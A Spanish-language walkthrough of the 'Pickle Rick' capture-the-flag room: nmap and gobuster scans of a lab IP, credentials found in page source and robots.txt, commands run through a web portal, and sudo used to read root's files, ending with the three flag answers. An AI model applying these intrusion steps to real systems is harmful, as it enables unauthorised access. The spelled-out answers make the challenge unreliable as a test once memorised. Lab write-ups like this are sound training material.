### Task 1 - Picke Rick

En el caso de este room, lo primero que hacemos es arrancar la maquina virtual, una vez que lo tenemos, procedemos a usar nuevamente la herramienta nmap, para escanear los puertos disponibles, haciendo lo siguiente:

```
sudo nmap -sS -A - T5 10.201.125.147
```

En seguida obtenemos los puertos listados:

```shell
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 4b:6e:46:ea:77:33:93:1d:89:8b:de:63:fe:94:66:e8 (RSA)
|   256 c9:12:bb:26:d4:25:dd:43:cf:1d:69:8f:11:7e:d6:a4 (ECDSA)
|_  256 aa:3c:2b:aa:87:2a:82:ab:4f:7c:11:17:c3:35:0e:76 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Rick is sup4r cool
|_http-server-header: Apache/2.4.41 (Ubuntu)
```

Por lo que ahora en la barra del navegador colocamos la IP que nos proporcionaron y el puerto 80:

```
10.201.125.147:80
```

Al cargar la página, nos aparece un mensaje de Rick hacia Morty, que dice lo siguiente:

```
Listen Morty... I need your help, I've turned myself into a pickle again and this time I can't change back!

I need you to *BURRRP*....Morty, logon to my computer and find the last three secret ingredients to finish my pickle-reverse potion. The only problem is, I have no idea what the *BURRRRRRRRP*, password was! Help Morty, Help!
```

Debido a que no encontramos más información, procedemos a revisar el código fuente de la página web, encontrando lo siguiente:

```
<!DOCTYPE html>  
<html lang="en">  
<head>  
<title>Rick is sup4r cool</title>  
<meta charset="utf-8">  
<meta name="viewport" content="width=device-width, initial-scale=1">  
<link rel="stylesheet" href="assets/bootstrap.min.css">  
<script src="assets/jquery.min.js"></script>  
<script src="assets/bootstrap.min.js"></script>  
<style>  
.jumbotron {  
background-image: url("assets/rickandmorty.jpeg");  
background-size: cover;  
height: 340px;  
}  
</style>  
</head>  
<body>  
  
<div class="container">  
<div class="jumbotron"></div>  
<h1>Help Morty!</h1></br>  
<p>Listen Morty... I need your help, I've turned myself into a pickle again and this time I can't change back!</p></br>  
<p>I need you to <b>*BURRRP*</b>....Morty, logon to my computer and find the last three secret ingredients to finish my pickle-reverse potion. The only problem is,  
I have no idea what the <b>*BURRRRRRRRP*</b>, password was! Help Morty, Help!</p></br>  
</div>  
  
<!--  
  
Note to self, remember username!  
  
Username: R1ckRul3s  
  
-->  
  
</body>  
</html>
```

De lo anterior se destaca el nombre de usuario, siendo `R1ckRul3s`, por lo que ahora se supone que en teoría debería de haber escondida una contraseña, por lo cual usaremos la herramienta gobuster para explorar si hay más directorios ocultos:

```
sudo gobuster dir -u http://10.201.125.147/ -w /usr/share/wordlist/dirbuster/directory-list-2.3-medium.txt -x php,txt,js,py,html
```

Al ejecutarlo en consola tenemos lo siguiente:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.201.125.147/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlist/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User agent:              gobuster/3.6
[+] Extensions:              php,txt,js,py,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 276] 
/index.html           (Status: 200) [Size: 1062]
/.html                (Status: 403) [Size: 276]
/login.php            (Status: 200) [Size: 882]
/assets               (Status: 301) [Size: 311] [--> http://10.201.125.147/assets/]
/portal.php           (Status: 302) [Size: 0] [--> /login.php]
/robots.txt           (Status: 200) [Size: 17]
Progress: 47536 / 1323366 (3.59%)^C
```

Nos ponemos a probar todos los directorios encontrados, en el caso de `10.201.125.147/robots.txt`, encontramos lo siguiente:

```
Wubbalubbadubdub
```

Esto se puede interpretar como una contraseña, por lo que en teoría ya tendríamos todo para acceder con ellos en la sitio web: `10.201.125.147/login.php`.

Una vez que ingresamos ahí, el sitio cambia a `10.201.125.147/portal.php`, donde tenemos una especie de consola, donde podemos digitar comandos para navegar en la página.

Iniciamos con el comando **ls**, obteniendo la siguiente salida:

```
Sup3rS3cretPickl3Ingred.txt  
assets  
clue.txt  
denied.php  
index.html  
login.php  
portal.php  
robots.txt
```

De aquí llama la atención `Sup3rS3cretPickl3Ingred.txt`, donde solo aplicamos un **cat** para conocer su contenido, arrojando un error, como se muestra a continuación:

```
Command disabled to make it hard for future PICKLEEEE RICCCKKKK.
```

Por lo que ahora se procede a utilizar otro comando, como lo es **less**, una vez ejecutado tenemos la siguiente salida:

```
mr. meeseek hair
```

Siendo esta el primer ingrediente de los tres que se requieren.

Ahora se probará con el archivo `clue.txt` aplicando el mismo comando **less**, obteniendo ahora:

```
Look around the file system for the other ingredient.
```

Por lo que haciendo uso del comando **ls** otra vez, procedemos a revisar el directorio *home*, encontrando lo siguiente:

```
rick
ubuntu
```

Ingresando al directorio *rick*, encontramos otro que se llama *second ingredients*, por lo que ahora usaremos nuevamente el comando **ls /home/rick/"second indredients"**, teniendo la siguiente salida:

```
1 jerry tear
```

Ahora al intentar acceder al directorio *root*, al no contar con los permisos necesarios no arroja nada, por lo que se prueba ahora con **sudo -l** para averiguar que privilegios tenemos, arrojando lo siguiente:

```
Matching Defaults entries for www-data on ip-10-201-125-147:
	env_reset, mail_badpass, source_pat=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
	
User www-data may run the following commands on ip-10-201-125-147:
	(ALL) NOPASSWD: ALL
```

Ahora que sabemos que con **sudo** podemos acceder al directorio *raíz*, procedemos a escribir el comando **sudo ls /root**, donde obtenemos la siguiente salida:

```
3rd.txt
snap
```

Por lo que procedemos a hacer un **less** haciendo uso de **sudo** de la siguiente manera: sudo **less /root/3rd.txt**, dándonos la siguiente salida:

```
3rd ingredients: fleeb juice
```

Por lo que ahora si podemos pasar a responder las preguntas de la tarea:
#### Pregunta 1:
En este caso se nos pide lo siguiente: ¿Cuál es el primer ingrediente que necesita Rick?.

Respuesta:

```respuesta
mr. meeseek hair
```
#### Pregunta 2:
Ahora tenemos: **¿Cuál es el segundo ingrediente de la poción de Rick?**

Respuesta:

```respuesta
1 jerry tear
```
#### Pregunta 3:
Por último tenemos: **¿Cuál es el último ingrediente?**

Respuesta:

```respuesta
fleeb juice
```

Terminando este room de forma correcta.